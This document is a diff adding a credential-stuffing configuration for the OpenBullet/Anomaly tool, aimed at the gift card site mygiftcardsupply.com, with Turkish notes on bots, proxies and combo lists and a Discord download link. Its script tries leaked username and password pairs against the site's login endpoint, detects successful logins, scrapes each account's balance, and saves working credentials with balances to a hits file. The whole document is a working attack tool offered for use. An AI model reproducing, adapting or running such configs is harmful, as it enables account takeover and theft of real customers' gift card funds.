@@ -1,0 +1,105 @@
+#You can download it as anom from this link:
+https://cdn.discordapp.com/attachments/982266499840491560/1008758941985013873/Mygiftcardsupply.com.anom
+virustotal: https://www.virustotal.com/gui/file/0170ec24eb61de53b8b73ecb65db767ba9d70a04d37d0b28720feb9016af1906?nocache=1
+
+Site Url: mygiftcardsupply.com
+Api:Hayır
+Captcha:Hayır
+Capture:Evet
+Bot:50-200
+Cpm:10-1000
+Proxy:Evet
+Combo:U:P | E:P 
+Hit: My Giftcard Sup.txt dosyasına kayıt eder
+
+
+
+[SETTINGS]
+{
+  "Name": "mygiftcardsupply.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-29T11:59:25.2092781-07:00",
+  "AdditionalInfo": "",
+  "Author":Fakecoder "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Length "action=mgcs_ajax_login&username=<USER>&password=<PASS>&remember=false" -> VAR "LEN" 
+
+REQUEST POST "https://www.mygiftcardsupply.com/wp-admin/admin-ajax.php" 
+  CONTENT "action=mgcs_ajax_login&username=<USER>&password=<PASS>&remember=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: www.mygiftcardsupply.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Content-Length: <LEN>" 
+  HEADER "Origin: https://www.mygiftcardsupply.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.mygiftcardsupply.com/my-account/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Wrong username or password." 
+  KEYCHAIN Success OR 
+    KEY "loggedin\":true" 
+
+REQUEST GET "https://www.mygiftcardsupply.com/cart/" 
+  
+  HEADER "Host: www.mygiftcardsupply.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.mygiftcardsupply.com/my-account/orders/" 
+
+PARSE "<SOURCE>" LR "class=\"woocommerce-Price-currencySymbol\">" "</span></span>" -> VAR "b" 
+
+PARSE "<b>" LR "</span>" "" CreateEmpty=FALSE -> CAP "Balance" "" "   @MRzodiack2 & @Fakecoderr" 
+
+UTILITY File "My Giftcard Sup.txt" AppendLines "««««««[hesap]»»»»»»\\r\\nCombo:<USER>:<PASS>\\r\\nMail:<USER>\\r\\nPassword:<PASS>\\r\\n««««««[Bakiye]»»»»»»\\r\\nBalance:<Balance>\\r\\n««««««♤[son]♤»»»»»»\\r\\nConfig By:@MRzodiack" 
